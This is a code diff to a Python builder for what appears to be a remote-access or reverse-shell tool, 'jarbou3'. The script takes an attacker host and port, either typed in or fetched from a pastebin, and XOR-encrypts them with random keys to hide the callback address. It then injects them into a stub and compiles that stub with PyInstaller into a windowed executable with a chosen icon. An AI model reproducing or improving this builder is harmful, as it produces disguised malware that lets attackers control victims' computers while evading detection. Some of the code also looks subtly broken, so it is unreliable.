@@ -68,27 +68,47 @@ def build():
         print('run installed.bat and restart the tool')
         exit()
     else:
+        def genkey(length: int) -> bytes:
+            return os.urandom(length)
+
+        def xor_strings(s, t) -> bytes:
+            if isinstance(s, str):
+                # Text strings contain single characters
+                return b"".join(chr(ord(a) ^ ord(b)) for a, b in zip(s, t))
+            else:
+
+                return bytes([a ^ b for a, b in zip(s, t)])
+
         print("""
 1) lhost and lport
 2) grab host and port from pastebin ex:127.0.0.1:4444
         """)
         c = int(input('choose:'))
         if c == 1:
+
             lhost = input('entre your host:')
+            keyhost = genkey(len(lhost))
+            cryptedhost = xor_strings(lhost.encode('utf8'), keyhost)
+
             lport = input('entre lport:')
+            keyport = genkey(len(lport))
+            cryptedport = xor_strings(lport.encode('utf8'), keyport)
             icon = ""
             while isfile(icon) == False:
                 icon = input('entre your icon path:')
             os.system('powershell -c cd stub; cp jarbou3.py ..')
-            replace_string('jarbou3.py', '$lhost', lhost)
-            replace_string('jarbou3.py', '$lport', lport)
+            replace_string('jarbou3.py', '$lhost', str(cryptedhost))
+            replace_string('jarbou3.py', '$lport', str(cryptedport))
+            replace_string("jarbou3.py","$hostkey",str(keyhost))
+            replace_string("jarbou3.py","$portkey",str(keyport))
             key = open('key.txt', 'r').read()
             replace_string('jarbou3.py', '$key', key)
 
             print('[+]Compiling')
             os.system('pyinstaller --noconfirm --onefile --windowed --upx-dir upx --icon  "' + icon + '"  "jarbou3.py"')
-            os.remove('jarbou3.py')
+
             os.system('powershell -c cd dist; cp jarbou3.exe ..')
+            os.remove('jarbou3.py')
         elif c == 2:
             URL = input('entre you url:')
             u = requests.get(URL).text
